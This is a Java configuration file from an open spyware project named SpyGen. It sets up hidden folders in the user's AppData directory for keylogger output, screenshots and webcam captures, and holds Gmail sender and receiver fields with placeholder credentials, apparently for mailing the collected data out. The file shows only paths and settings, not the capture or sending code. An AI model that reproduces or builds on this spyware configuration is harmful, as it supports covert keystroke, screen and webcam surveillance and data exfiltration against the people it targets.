package com.houarizegai.spygen.global;

import java.io.File;

public class Settings {
    // Path you want to save results
    public static String savePath = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\";
    public static final String APP_NAME = "SpyGen";
    public static final String KEYLOGGER_PATH = savePath + APP_NAME + "/keyloggers/";
    public static final String SCREENSHOT_PATH = savePath + APP_NAME + "/screenshots/";
    public static final String WEBCAM_PATH = savePath + APP_NAME + "/webcam/";

    /* Mail information */
    public static String senderMail = "senderMail@gmail.com";
    public static String senderPassword = "your gmail password";
    public static String receiverMail = "receiverMail@gmail.com";

    static {
        initSaveFolders();
    }

    private static void initSaveFolders() {
        createFolderIfNotExists(savePath + APP_NAME + "/");
        createFolderIfNotExists(KEYLOGGER_PATH);
        createFolderIfNotExists(SCREENSHOT_PATH);
        createFolderIfNotExists(WEBCAM_PATH);
    }

    private static void createFolderIfNotExists(String folderPath) {
        File directory = new File(folderPath);
        if (!directory.exists())
            directory.mkdir();
    }

}
